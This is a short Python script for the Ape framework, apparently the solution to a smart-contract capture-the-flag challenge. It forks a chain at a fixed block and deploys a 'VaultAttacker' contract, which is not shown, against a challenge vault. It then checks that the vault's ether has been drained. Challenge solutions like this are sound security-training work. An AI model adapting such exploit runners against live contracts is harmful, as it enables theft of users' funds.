from ape import accounts, project, Contract
from .utils.helper import fork, get_block, prep_blueprint_deployment

BLOCK = 7522306
VAULT_CONTRACT = "0xBBCf8b480F974Fa45ADc09F102496eDC38cb3a6C"


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # setting up attacker
    attacker = accounts.test_accounts[0]

    # fork chain at block height
    print(f"\n--- Forking chain at block height: {BLOCK} ---\n")
    fork(BLOCK)
    assert get_block() == BLOCK

    # get challenge contract
    print("\n--- Getting Challenge Contracts ---\n")
    vault = Contract(VAULT_CONTRACT)

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    blueprint_address, deployment_code = prep_blueprint_deployment("VaultAttacker")
    project.VaultAttackerHelper.deploy(
        blueprint_address,
        deployment_code,
        vault.address,
        sender=attacker,
    )

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: You stole all the ETHER in the vault ---\n")

    assert vault.balance == 0

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
